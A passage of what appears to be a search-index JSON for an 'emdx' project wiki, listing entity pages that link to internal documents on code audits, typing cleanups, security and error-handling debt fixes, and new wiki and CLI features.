Parallel_Explore Synthesis</p> <p>Connection pooling in <code>connection.py</code></p> </li> <li> <p>Configurable refresh interval (currently hardcoded 5s)</p> </li> </ul>"},{"location":"entities/success-metrics/#implementation-quick-reference","title":"Implementation Quick Reference","text":"File Key Lines Changes Needed <code>activity_view.py</code> 392-... <ul> <li>#4098 Feature Exploration: Parallel Tracks (Master) <ul> <li>Track C: Use similarity for RAG context injection</li> </ul> </li> <li>Track B: Add TUI modal for export</li> </ul>"},{"location":"entities/success-metrics/#phase-3-integration","title":"Phase 3: Integration","text":"<p>Dashboard pulls everything together. - Track D: Integrate insights from A, B, C into unified view</p>"},{"location":"entities/success-metrics/#quick-commands","title":"Quick Commands","text":"<p>```bas...</p> <ul> <li>#293 emdx Tag System Implementation Plan <p>Advanced Queries</p> </li> <li>Exclude tags: <code>--not-tags archived,old</code></li> <li>Tag combinations: <code>(python AND api) OR (rust AND web)</code></li> <li> <p>Saved tag queries/filters</p> </li> <li> <p>Integrations</p> </li> <li>Sync tags with Obsidian/Notion</li> <li>Export tag statistics</li> <li> <p>Tag-...</p> </li> <li> <p>#247 Clauding Implementation Plan - Critical Issues Resolution</p> <p>Access control/user management</p> </li> <li>Data synchronization across machines</li> </ul>"},{"location":"entities/success-metrics/#testing-strategy","title":"Testing Strategy","text":""},{"location":"entities/success-metrics/#unit-tests","title":"Unit Tests","text":"<ul> <li>Test each function in isolation</li> <li>Mock database interactions</li> <li>Validate error handling paths</li> </ul>"},{"location":"entities/success-metrics/#integration-tests","title":"Integration Tests","text":"<ul> <li>Test full workflows</li> <li> <p>...</p> </li> <li> <p>#4 CLA Textual Migration Plan   Section: Technical Considerations</p> </li> <li>[ ] All current features working</li> <li>[ ] Improved scroll performance</li> <li>[ ] Cross-platform compatibility (Linux, macOS, Windows)</li> <li> <p>[ ] Response time &lt; 100ms for searc...</p> </li> <li> <p>#14 Document Version Tracking System Design</p> <p>Access Control: Inherits from main document permissions</p> </li> <li>Change Attribution: Track editor for each version</li> </ul>"},{"location":"entities/success-metrics/#success-metrics_3","title":"Success Metrics","text":""},{"location":"entities/success-metrics/#rollout-plan","title":"Rollout Plan","text":""},{"location":"entities/success-metrics/#phase-1-core-infrastructure-week-1","title":"Phase 1: Core Infrastructure (Week 1)","text":"<ul> <li>Deploy database schema</li> <li>Implement basic version trigger</li> <li> <p>Add claude-h...</p> </li> <li> <p>#18 Clauding Project Gameplan - Updated</p> <p>Performance</p> </li> <li>Optimize large document handling</li> <li>Implement query caching</li> <li>Add connection pooling</li> <li>Background indexing</li> <li> <p>Pagination for large result sets</p> </li> <li> <p>Code Quality</p> </li> <li>Add comprehensive logging</li> <li> <p>Implement debug mod...</p> </li> <li> <p>#450 Claude Code Tag System Enhancement Ideas   Section: Claude Code Tag System Enhancement Ideas</p> </li> </ul>"},{"location":"entities/success-metrics/#3-success-metrics-analytics","title":"3. Success Metrics &amp; Analytics","text":"<p>Track whether gameplans work: ```bash</p>"},{"location":"entities/success-metrics/#find-all-gameplans-and-their-outcomes","title":"Find all gameplans and their outcomes","text":"<p>emdx find \"tags:gameplan\" emdx find \"tags:gameplan,successful\"  # Success r...</p>"},{"location":"entities/success-metrics/#related-entities","title":"Related Entities","text":"<ul> <li><code>adoption</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>\ud83d\udd04 known issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>\u2705 what's working well</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>workflows/database.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>standard fish plugin structure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>speed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>short-term goals (2 weeks)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>shell support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>search enhancements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>rich content support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/success/","title":"success","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2025-07-12</p>"},{"location":"entities/success/#documents-10","title":"Documents (10)","text":"<ul> <li>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary <p>...lt.to_dict()<code>:</code>task_id<code>,</code>doc_id<code>,</code>output_doc_id<code>,</code>execution_id<code>,</code>exit_code<code>,</code>success<code>,</code>duration_seconds<code>,</code>duration`</p> </li> <li>Note about optional fields (<code>pr_url</code>, <code>branch_name</code>, <code>error</code>)</li> <li> <p>Parallel task JSON output structure showing fields from `Par...</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...section at the end of the file</p> </li> <li> <p>13 fields matching <code>ExecutionResult.to_dict()</code>: <code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, `e...</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...n a new \"Unified Executor types\" section (before Document Merger types)</p> </li> <li> <p>Fields: <code>success</code> (bool), <code>execution_id</code> (int), <code>log_file</code> (str), <code>output_doc_id</code> (int | None), <code>output_content</code> (str | None), <code>tokens_used</code> (int), <code>input_tokens</code> (int), `output_toke...</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: 1. <code>unified_executor.py:192</code> \u2014 <code>ExecutionResult.to_dict()</code></p> <p>Shape is fully known \u2014 it serializes a dataclass with 12 fixed fields (<code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, `e...</p> </li> <li> <p>#6535 EMDX Future Directions: Agent-First Design [4/4]   Section: 3. CLAUDE.md Evolution Engine**</p> <p>Proposed:</p> </li> </ul> <pre><code>emdx suggest-claude-md  # Analyzes recent successes/failures\n                        # Proposes CLAUDE.md additions\n                        # \"Consider adding: always run ruff before commit\"\n</code></pre> <ul> <li> <p>#6495 None Type Analysis [1/7]   Section: LEGITIMATE None Annotations in delegate.py</p> <p>...| Prompt is optional | | 460-469 | <code>@dataclass SingleResult</code> \u2014 all fields except <code>success</code> | All optional metadata | | 472-487 | `_run_single(title: str | None, model: str | None, pr_branch: str | None, working_dir: str | None, source_doc_id: int | N...</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Model Layer (tasks.py)</p> <p>...sk_id)<code>| Get child tasks ordered | |</code>get_recent_completed_tasks(limit)<code>| Recent successes | |</code>get_failed_tasks(limit)` | Recent failures |</p> </li> <li> <p>#452 Minimal Tag Taxonomy - Space-Efficient   Section: Core Tags (Single Words Only)</p> </li> <li><code>success</code> - Worked as intended</li> <li><code>failed</code> - Didn't work</li> <li><code>partial</code> - Mixed results</li> </ul>"},{"location":"entities/success/#outcomes-success-tracking","title":"Outcomes (Success Tracking)","text":""},{"location":"entities/success/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.4)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>document merger</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>delegate: fix pr #687 \u2014 add executionresultdict typeddict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>delegate: add executionresultdict typeddict for executionresult.to_dict()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>mapping[str, any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>`emdx/services/unified_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/summary-audited/","title":"summary audited","text":"<p>Type: proper_noun | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/summary-audited/#documents-14","title":"Documents (14)","text":"<ul> <li>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/summary-audited/#synthes-14","title":"Synthes [1/4]","text":""},{"location":"entities/summary-audited/#dead-code-audit-emdxservices","title":"Dead Code Audit: <code>emdx/services/</code>","text":""},{"location":"entities/summary-audited/#summary","title":"Summary","text":"<p>Audited every public function/method across 24 files in <code>emdx/services/</code> (+ 4 in <code>cli_executor/</code>). Checked each against the full codebase (excluding the defining file and <code>tests/</code>).</p> <p>**Result: 30 fun...</p> <ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/summary-audited/#synthes-34","title":"Synthes [3/4]","text":""},{"location":"entities/summary-audited/#dead-code-audit-emdxconfig-and-emdxmodels","title":"Dead Code Audit: <code>emdx/config/</code> and <code>emdx/models/</code>","text":""},{"location":"entities/summary-audited/#summary_1","title":"Summary","text":"<p>Audited every public symbol in <code>constants.py</code>, <code>tagging_rules.py</code>, <code>cli_config.py</code>, <code>ui_config.py</code>, and flagged items in <code>models/executions.py</code>, <code>models/tags.py</code>, <code>models/tasks.py</code>....</p> <ul> <li>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3] </li> </ul>"},{"location":"entities/summary-audited/#audit-emdxui-any-typed-parameters-that-could-use-concrete-types","title":"Audit: <code>emdx/ui/</code> \u2014 <code>Any</code>-Typed Parameters That Could Use Concrete Types","text":""},{"location":"entities/summary-audited/#summary_2","title":"Summary","text":"<p>Audited all 40+ Python files in <code>emdx/ui/</code>. Found 21 distinct fixable <code>Any</code> usages across 14 files. Several are already correctly typed (Textual `*args: Any,...</p> <ul> <li>#6434 Any/None typing audit [4/5] </li> </ul>"},{"location":"entities/summary-audited/#any-type-audit-emdxservices","title":"Any Type Audit: emdx/services/","text":""},{"location":"entities/summary-audited/#summary_3","title":"Summary","text":"<p>Audited 14 files in <code>emdx/services/</code> for unnecessary <code>Any</code> usage in function signatures and return types.</p>"},{"location":"entities/summary-audited/#cascade_servicepy","title":"cascade_service.py","text":"<p>| Function | Any Location | Replaceable? | Suggested Replacement | |--...</p> <ul> <li>#6433 Any/None typing audit [2/5] </li> </ul>"},{"location":"entities/summary-audited/#any-type-annotation-audit-emdxmodels","title":"Any Type Annotation Audit - emdx/models/","text":""},{"location":"entities/summary-audited/#summary_4","title":"Summary","text":"<p>Audited 7 files in <code>emdx/models/</code>. Found 6 uses of Any across 3 files.</p>"},{"location":"entities/summary-audited/#tagspy","title":"tags.py","text":"<p>| Location | Usage | Replaceable? | Suggested Replacement | |----------|-------|--------------|------...</p> <ul> <li>#6432 Any/None typing audit [1/5] </li> </ul>"},{"location":"entities/summary-audited/#any-type-annotation-audit-emdxdatabase","title":"Any Type Annotation Audit: emdx/database/","text":""},{"location":"entities/summary-audited/#summary_5","title":"Summary","text":"<p>Audited 7 files for unnecessary <code>Any</code> usage. Found 12 functions using <code>Any</code> across 5 files. Many uses are for SQL parameter lists (legitimate) or internal dict manipulation pre-cast (accept...</p> <ul> <li>#6416 Type System Audit: Replace Any/None with Concrete Types [1/4] </li> </ul>"},{"location":"entities/summary-audited/#type-system-audit-emdxmodels-dictstr-any-functions","title":"Type System Audit: emdx/models/ \u2014 dict[str, Any] Functions","text":""},{"location":"entities/summary-audited/#summary_6","title":"Summary","text":"<p>Audited all functions in <code>emdx/models/</code> that return <code>dict[str, Any]</code> or <code>list[dict[str, Any]]</code>. Found 15 functions that could benefit from TypedDict or dataclass replacemen...</p> <ul> <li>#6373 Codebase Bug Audit 2026-02-15 [7/10] </li> </ul>"},{"location":"entities/summary-audited/#bug-audit-emdxutils-2026-02-15","title":"Bug Audit: emdx/utils/ \u2014 2026-02-15","text":""},{"location":"entities/summary-audited/#summary_7","title":"Summary","text":"<p>Audited 17 files in emdx/utils/. Found 7 bugs ranging from low to medium severity. No critical security vulnerabilities identified.</p>"},{"location":"entities/summary-audited/#bugs-found","title":"Bugs Found","text":""},{"location":"entities/summary-audited/#1-file_sizepy37-45-incorrect","title":"1. file_size.py:37-45 \u2014 Incorrect...","text":"<ul> <li>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14] </li> </ul>"},{"location":"entities/summary-audited/#emdx-dependency-debt-audit-report","title":"EMDX Dependency Debt Audit Report","text":""},{"location":"entities/summary-audited/#summary_8","title":"Summary","text":"<p>Audited <code>pyproject.toml</code> for outdated dependencies, unused packages, version pinning issues, missing groups, and stdlib replacement opportunities.</p>"},{"location":"entities/summary-audited/#issues-found","title":"Issues Found","text":""},{"location":"entities/summary-audited/#critical-0","title":"\ud83d\udd34 CRITICAL (0)","text":"<p>No critical i...</p> <ul> <li>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14] </li> </ul>"},{"location":"entities/summary-audited/#error-handling-debt-audit-emdx-project","title":"Error Handling Debt Audit - EMDX Project","text":""},{"location":"entities/summary-audited/#summary_9","title":"Summary","text":"<p>Audited error handling patterns across the emdx codebase. Found 143 instances of broad exception catches and 31 instances of silent failures. Key findings organized by severity.</p>"},{"location":"entities/summary-audited/#_1","title":"...","text":"<ul> <li>#6177 Delegate: Audit emdx/commands/ for dead code </li> </ul>"},{"location":"entities/summary-audited/#dead-code-audit-emdxcommands","title":"Dead Code Audit: emdx/commands/","text":""},{"location":"entities/summary-audited/#summary_10","title":"Summary","text":"<p>Audited all 19 files in emdx/commands/ for dead code related to removed modules (workflows, agents, mail_service).</p>"},{"location":"entities/summary-audited/#findings","title":"Findings","text":""},{"location":"entities/summary-audited/#stale-references-found","title":"Stale References Found","text":"<ol> <li>emdx/commands/maintain.py:173-174</li> <li> <p>I...</p> </li> <li> <p>#6173 Delegate: Audit docs/ directory for accuracy. For EACH file in docs/ ( [7/17]</p> </li> </ol>"},{"location":"entities/summary-audited/#docs-directory-accuracy-audit","title":"docs/ Directory Accuracy Audit","text":""},{"location":"entities/summary-audited/#summary_11","title":"Summary","text":"<p>Audited 10 documentation files for accuracy against current codebase.</p>"},{"location":"entities/summary-audited/#docsreadmemd","title":"docs/README.md","text":"<p>Status: \u2705 CLEAN - No issues found</p>"},{"location":"entities/summary-audited/#docsai-systemmd","title":"docs/ai-system.md","text":"<p>Status: \u2705 CLEAN - No issues found - Accur...</p> <ul> <li>#6174 Delegate: Audit emdx/main.py and the lazy loading system. Check: (1) a [9/17] </li> </ul>"},{"location":"entities/summary-audited/#audit-mainpy-and-lazy-loading-system","title":"Audit: main.py and Lazy Loading System","text":""},{"location":"entities/summary-audited/#summary_12","title":"Summary","text":"<p>Audited emdx/main.py and emdx/utils/lazy_group.py for correctness, staleness, and dead code.</p>"},{"location":"entities/summary-audited/#1-lazy_subcommands-module-existence","title":"(1) LAZY_SUBCOMMANDS Module Existence","text":"<p>Status: \u2705 ALL EXIST</p> <p>All modules in LAZY_SUBCOMMANDS...</p> <ul> <li>#6164 Delegate: Audit CLAUDE.md (578 lines) for accuracy. Check: (1) does it [6/17] </li> </ul>"},{"location":"entities/summary-audited/#claudemd-audit-report","title":"CLAUDE.md Audit Report","text":""},{"location":"entities/summary-audited/#summary_13","title":"Summary","text":"<p>Audited CLAUDE.md (579 lines) for stale references to removed features. Found 4 stale/incorrect references.</p>"},{"location":"entities/summary-audited/#audit-checklist-results","title":"Audit Checklist Results","text":""},{"location":"entities/summary-audited/#1-references-to-emdx-workflow-commands","title":"(1) References to 'emdx workflow' commands","text":"<p>\u2705 PASS - No reference...</p>"},{"location":"entities/summary-audited/#related-entities","title":"Related Entities","text":"<ul> <li><code>load_config()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>suggested replacement</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>wiki_synthesis_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>services/claude_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>services/auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>dead</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>params: list[any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>emdx/models/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>any type annotation audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/summary-implemented/","title":"summary implemented","text":"<p>Type: proper_noun | Mentioned in: 15 documents | First seen: 2026-02-13</p>"},{"location":"entities/summary-implemented/#documents-15","title":"Documents (15)","text":"<ul> <li>#6861 Delegate: FEAT-33 (Issue #1245): Add editorial prompt injection for wi [3/4] </li> </ul> <p>Implemented editorial prompt injection for wiki article generation (Issue #1245). PR: https://github.com/arockwell/emdx/pull/798</p>"},{"location":"entities/summary-implemented/#summary","title":"Summary","text":""},{"location":"entities/summary-implemented/#changes-made","title":"Changes made:","text":"<ol> <li> <p>Migration 051 (<code>emdx/database/migrations.py</code>): Added <code>editorial_prompt TEXT</code> colum...</p> </li> <li> <p>#6858 Delegate: FEAT-31 (Issue #1243): Add wiki topic rename command. Add 'e [2/4]</p> </li> </ol> <p>Implemented <code>emdx maintain wiki rename &lt;topic_id&gt; &lt;new_label&gt;</code> command for Issue #1243.</p> <p>Changes: - <code>emdx/commands/maintain.py</code> \u2014 Added <code>wiki_rename</code> command to <code>wiki_app</code> that:   - Looks up the topic by ID, rejecting if not found...</p> <ul> <li>#6856 Delegate: FEAT-40 (Issue #1252): Add wiki quality ratings. Add rating  [4/4] </li> </ul> <p>Implemented wiki quality ratings for Issue #1252. PR: https://github.com/arockwell/emdx/pull/789</p>"},{"location":"entities/summary-implemented/#summary_1","title":"Summary","text":""},{"location":"entities/summary-implemented/#summary_2","title":"Summary","text":""},{"location":"entities/summary-implemented/#changes-made_1","title":"Changes made:","text":"<p><code>emdx/database/migrations.py</code> \u2014 Added migrations 048 and 050: - <code>migration_048_add_wiki_article_rating</code>: Adds `rating...</p> <ul> <li>#6850 Delegate: FEAT-37 (Issue #1249): Add wiki coverage command. Create 'em [1/4] </li> </ul> <p>Implemented <code>emdx maintain wiki coverage</code> command (Issue #1249).</p> <p>What it does: Cross-references all non-deleted user docs (<code>doc_type='user'</code>) against the <code>wiki_topic_members</code> table and reports which documents are not covered by any w...</p> <ul> <li>#6824 Delegate: Document #6822 (Wiki System Architecture Analysis &amp; Roadmap) [2/2] </li> </ul> <p>Implemented FEAT-36: wiki_runs table and wiki runs CLI command.</p> <p>Changes across 4 files (+186 lines):</p> <ol> <li> <p><code>emdx/database/migrations.py</code> \u2014 Added migration 046 creating <code>wiki_runs</code> table with columns: id, started_at, completed_at, t...</p> </li> <li> <p>#6823 Delegate: Document #6822 (Wiki System Architecture Analysis &amp; Roadmap) [1/2]</p> </li> </ol> <p>Implemented ARCH-7 and ARCH-8 from the wiki system roadmap:</p> <p>Migration 046 (<code>migration_046_add_doc_type</code>): - Adds <code>doc_type TEXT NOT NULL DEFAULT 'user'</code> column to the <code>documents</code> table - Creates index <code>idx_documents_doc_type</code> for eff...</p> <ul> <li>#6448 Implement emdx compact command </li> </ul>"},{"location":"entities/summary-implemented/#summary_3","title":"Summary","text":""},{"location":"entities/summary-implemented/#summary_4","title":"Summary","text":""},{"location":"entities/summary-implemented/#summary_5","title":"Summary","text":""},{"location":"entities/summary-implemented/#implementation-emdx-compact-command","title":"Implementation: emdx compact command","text":""},{"location":"entities/summary-implemented/#summary_6","title":"Summary","text":"<p>Implemented <code>emdx compact</code> command for AI-powered document synthesis per gameplan #6368.</p>"},{"location":"entities/summary-implemented/#components-created","title":"Components Created","text":""},{"location":"entities/summary-implemented/#1-synthesisservice-emdxservicessynthesis_servicepy","title":"1. SynthesisService (<code>emdx/services/synthesis_service.py</code>)","text":"<ul> <li> <p>Shared service using...</p> </li> <li> <p>#6411 Delegate: Implement 'emdx briefing' command. This is a new command tha</p> </li> </ul>"},{"location":"entities/summary-implemented/#implementation-emdx-briefing-command","title":"Implementation: <code>emdx briefing</code> Command","text":""},{"location":"entities/summary-implemented/#summary_7","title":"Summary","text":"<p>Implemented the <code>emdx briefing</code> command that synthesizes recent emdx activity into a human-readable summary. This provides a quick overview of what happened across tasks, documents, and delegate...</p> <ul> <li>#6355 Delegate: Document #6349 (Service Layer &amp; Cascade Refactor Plan): Implementation Complete </li> </ul>"},{"location":"entities/summary-implemented/#service-layer-cascade-refactor-implementation","title":"Service Layer &amp; Cascade Refactor Implementation","text":""},{"location":"entities/summary-implemented/#summary_8","title":"Summary","text":"<p>Implemented the refactor plan from emdx #6349, focusing on moving raw SQL out of the UI layer into the service layer.</p>"},{"location":"entities/summary-implemented/#audit-results","title":"Audit Results","text":""},{"location":"entities/summary-implemented/#raw-sql-in-ui-files","title":"Raw SQL in UI Files","text":"<p>Found 1 raw SQL query in UI...</p> <ul> <li>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project) </li> </ul>"},{"location":"entities/summary-implemented/#configuration-debt-fix-implementation","title":"Configuration Debt Fix Implementation","text":""},{"location":"entities/summary-implemented/#summary_9","title":"Summary","text":"<p>Implemented fixes for the Configuration Debt Audit findings (Document #6230). This addresses the \"Immediate\" recommendations from the audit.</p>"},{"location":"entities/summary-implemented/#changes-made_2","title":"Changes Made","text":""},{"location":"entities/summary-implemented/#1-created-configmodelspy-si","title":"1. Created <code>config/models.py</code> - Si...","text":"<ul> <li>#6261 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [15/37] </li> </ul>"},{"location":"entities/summary-implemented/#error-handling-debt-implementation","title":"Error Handling Debt Implementation","text":""},{"location":"entities/summary-implemented/#summary_10","title":"Summary","text":"<p>Implemented error handling improvements based on the gameplan audit findings.</p>"},{"location":"entities/summary-implemented/#changes-made_3","title":"Changes Made","text":""},{"location":"entities/summary-implemented/#1-custom-exception-hierarchy-emdxexceptionspy","title":"1. Custom Exception Hierarchy (<code>emdx/exceptions.py</code>)","text":"<p>Created a structured exception hierarchy:</p> <ul> <li> <p>*...</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)</p> </li> </ul>"},{"location":"entities/summary-implemented/#security-fix-command-injection-in-delegate-each","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/summary-implemented/#summary_11","title":"Summary","text":"<p>Implemented the critical security fix identified in Document #6230 (Security Audit Report) for the command injection vulnerability in <code>emdx delegate --each</code>.</p>"},{"location":"entities/summary-implemented/#issue","title":"Issue","text":"<p>The `_run_disco...</p> <ul> <li>#6256 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [19/37] </li> </ul>"},{"location":"entities/summary-implemented/#dead-code-audit-implementation","title":"Dead Code Audit Implementation","text":""},{"location":"entities/summary-implemented/#summary_12","title":"Summary","text":"<p>Implemented the dead code cleanup from Document #6230 gameplan.</p>"},{"location":"entities/summary-implemented/#changes-made_4","title":"Changes Made","text":""},{"location":"entities/summary-implemented/#files-modified-17-total","title":"Files Modified (17 total)","text":"<p>Commands: - cascade.py: Removed unused <code>Path</code> import - executions.py: Removed unused `fi...</p> <ul> <li>#6248 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [11/37] </li> </ul> <p>PR: https://github.com/arockwell/emdx/pull/490 Branch: feat/delegate-audit-buildci-debt-in-the-emdx-project-ch Date: 2026-02-14</p>"},{"location":"entities/summary-implemented/#buildci-debt-implementation-report","title":"BUILD/CI DEBT Implementation Report","text":""},{"location":"entities/summary-implemented/#summary_13","title":"Summary","text":"<p>Implemented all recommended CI/CD improvements from the BU...</p> <ul> <li>#6138 Delegate: Read gameplan by running: emdx view 6099. Implement the Smar [3/7] </li> </ul>"},{"location":"entities/summary-implemented/#smart-priming-feature-implementation-complete","title":"Smart Priming Feature Implementation Complete","text":""},{"location":"entities/summary-implemented/#summary_14","title":"Summary","text":"<p>Implemented the Smart Priming feature (<code>emdx prime --smart</code>) as described in gameplan #6099.</p>"},{"location":"entities/summary-implemented/#what-was-implemented","title":"What was implemented","text":"<ol> <li>Git context detection - Shows current branch, last 3 commits,...</li> </ol>"},{"location":"entities/summary-implemented/#related-entities","title":"Related Entities","text":"<ul> <li><code>wiki_app</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>emdx/database/migrations.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>emdx/commands/maintain.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.8)</li> <li><code>emdx/services/wiki_synthesis_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.2)</li> <li><code>wiki_topics</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.0)</li> <li><code>changes made:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.0)</li> <li><code>emdx/commands/maintain.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=3.9)</li> <li><code>main.py</code> 